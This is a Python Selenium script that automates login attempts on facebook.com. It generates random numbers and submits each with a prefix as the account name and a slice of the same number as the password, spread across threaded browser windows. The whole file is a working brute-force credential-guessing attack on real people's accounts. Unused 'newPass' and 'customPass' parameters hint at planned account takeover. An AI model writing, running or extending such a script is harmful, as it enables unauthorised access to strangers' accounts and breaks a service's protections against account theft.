from random import randint
from threading import Thread
from time import sleep
from selenium import webdriver
from selenium.webdriver.common.by import By






def run(firstNum, secondNum, totalTabs, totalAccount, prefix, newPass, customPass, passwordIndex):
    print(prefix)
    numberTried = []
    mainList = []
    tmpList = []
    while True:
        tmp = randint(firstNum, secondNum)
        if (tmp not in numberTried):
            numberTried.append(tmp)
            tmpList.append(tmp)
            if len(tmpList) == totalAccount // totalTabs:
                mainList.append(tmpList)
                tmpList = []
            if(len(mainList) == totalTabs):
                break       
    print(mainList)
        
    def tryWithCred(driver, number):
        password = ''
        if(passwordIndex < 0):
            password = str(number)[passwordIndex:]
        else:
            password = str(number)[:passwordIndex]

        emailInput = driver.find_element(By.ID, "email")
        emailInput.send_keys(f"{prefix}{number}")
        passInput = driver.find_element(By.ID, "pass")
        passInput.send_keys(password)
        loginBtn = driver.find_element(By.NAME, 'login')
        loginBtn.click()

    for numbers in mainList:
        def tryAccount(numbers):
            driver = webdriver.Chrome(executable_path='./chromedriver.exe')
            for number in numbers:
                driver.get("https://www.facebook.com/")
                tryWithCred(driver, number)
                print(number)
            
        t = Thread(target=tryAccount, args=(numbers,))
        t.start()
    
    print({firstNum, secondNum, totalTabs, totalAccount, prefix, newPass, customPass, passwordIndex})